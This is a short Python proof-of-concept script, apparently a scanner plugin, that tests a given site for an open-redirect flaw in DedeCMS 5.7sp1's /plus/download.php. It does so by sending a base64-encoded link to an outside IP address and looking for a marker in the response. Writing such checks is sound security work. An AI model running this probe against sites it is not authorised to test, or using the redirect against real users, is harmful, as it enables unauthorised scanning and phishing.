#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms download.php重定向漏洞
referer: http://skyhome.cn/dedecms/357.html
author: Lucifer
description: 在dedecms 5.7sp1的/plus/download.php中67行存在的代码，即接收参数后未进行域名的判断就进行了跳转。
'''
import sys
import requests
import warnings
from termcolor import cprint

class dedecms_download_redirect_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cDovLzQ1Ljc2LjE1OC45MS9zc3Jm"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"100e8a82eea1ef8416e585433fd8462e" in req.text:
                cprint("[+]存在dedecms download.php重定向漏洞...(低危)\tpayload: "+vulnurl, "blue")
                return True,vulnurl,"dedecms download.php重定向漏洞",payload,req.text
            else:
                cprint("[-]不存在dedecms_download_redirect漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = dedecms_download_redirect_BaseVerify(sys.argv[1])
    testVuln.run()
